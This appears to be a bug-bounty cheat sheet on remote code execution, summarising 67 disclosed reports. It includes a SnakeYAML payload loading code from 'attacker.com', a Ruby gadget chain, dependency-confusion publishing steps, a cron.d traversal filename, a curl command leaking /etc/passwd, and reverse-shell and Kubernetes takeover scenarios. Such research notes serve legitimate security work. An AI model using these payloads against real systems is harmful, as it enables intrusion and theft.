# RCE — 67 Disclosed Reports

---

## High-Signal Targets

- Self-hosted Git platforms with privilege escalation chains
- Supply chain infrastructure: npm, PyPI via dependency confusion
- CI/CD pipelines and build systems
- Admin consoles using template engines for configuration rendering
- Kubernetes API servers with permissive RBAC
- Mobile backends and OAuth implementations processing untrusted data

---

## Hunting Methodology

1. Identify admin configuration UIs that write to system-level config files
2. Look for serialization formats in cookies, hidden fields, POST bodies (Java: `rO0AB`, `AC ED 00 05`; PHP: `O:4:`)
3. Enumerate internal package names from JS bundles and GitHub repos
4. Test file upload filenames for path traversal reaching execution contexts
5. Check Java CLIs using args4j for `@filename` expansion exposed over HTTP
6. Map template engine usage in admin/config panels
7. Check Kubernetes API accessibility and RBAC policies

---

## Attack Vectors

**Configuration injection:**
- syslog-ng `program()` destinations
- collectd `exec` plugin
- Nomad template functions
- Any web UI that writes to daemon config files without sanitization

**Deserialization gadget chains:**
```java
// SnakeYAML
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]

// Ruby YAML
!ruby/object:Gem::Installer i: !ruby/object:Gem::SpecFetcher i: !ruby/object:Gem::Installer ...

// Java detection (base64 of AC ED 00 05)
rO0ABXNy...
```

**Dependency confusion:**
```bash
# 1. Find internal package names from JS bundles or GitHub repos
grep -r "\"name\":" package.json
grep -r "require(" dist/*.js | grep -v node_modules

# 2. Check if name exists on public registry
npm view <internal-package-name>

# 3. Publish higher-versioned public package
# postinstall script executes on victim CI/CD during npm install
```

**Path traversal to execution:**
```
# Rails ActiveStorage
../../../etc/cron.d/backdoor
# Filename reaches execution context if normalization is bypassed
```

**args4j file expansion (Jenkins CVE-2024-23897 family):**
```bash
# Java CLIs using @filename expansion
curl -X POST "https://target.com/cli" --data "@/etc/passwd"
# Error messages leak file contents
```

---

## Root Causes (from paid reports)

1. Template engines used in admin config UIs without sandboxing
2. Deserialization of user-controlled data without type validation
3. Internal package names predictable or leaked in public assets
4. File upload handlers normalizing paths after security checks
5. Java CLI tools exposing args4j expansion over HTTP without auth
6. Kubernetes API servers publicly accessible with default RBAC
7. postinstall scripts executing without integrity verification

---

## Real-World Scenarios

**Scenario 1 - Management console privilege escalation**
"Editor" role on enterprise Git server accesses syslog-ng config UI. Injects reverse shell command into daemon configuration running as root. No privilege escalation needed - the daemon already runs as root.

**Scenario 2 - Build infrastructure compromise via dependency confusion**
Internal npm package names extracted from minified JS bundle. Higher-versioned public package published. CI/CD farm installs the attacker package during build, executing `postinstall` script across all build agents.

**Scenario 3 - Kubernetes cluster takeover**
Publicly accessible API server with permissive RBAC. Secret enumeration reveals service account tokens. Privileged pod deployed with hostPath mount, achieving node-level access.

---

## Pre-Submission Validation Gate

1. Demonstrable execution: output captured in response or OOB callback received
2. Concrete victim impact articulated: what does an attacker control after exploitation?
3. Reproducible from scratch in under 10 minutes
